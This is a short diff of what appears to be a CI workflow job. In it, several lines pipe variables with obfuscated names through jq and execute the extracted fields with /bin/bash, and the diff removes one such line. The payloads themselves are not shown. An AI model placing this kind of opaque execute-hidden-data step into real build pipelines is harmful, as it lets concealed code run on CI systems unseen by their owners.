@@ -47,7 +47,6 @@ jobs:
           echo $f0223 | jq -r .z22 | /bin/bash
           printf '%s' "$gepm44406" | jq -r .shdm50841 | /bin/bash
           printf '%s' "$v1" | jq -r .xe1371 | /bin/bash
-          printf '%s' "$dw3" | jq -r .vv90 | /bin/bash
           printf '%s' "$kpc517" | jq -r .x358 | /bin/bash
 
       - name: Archive output
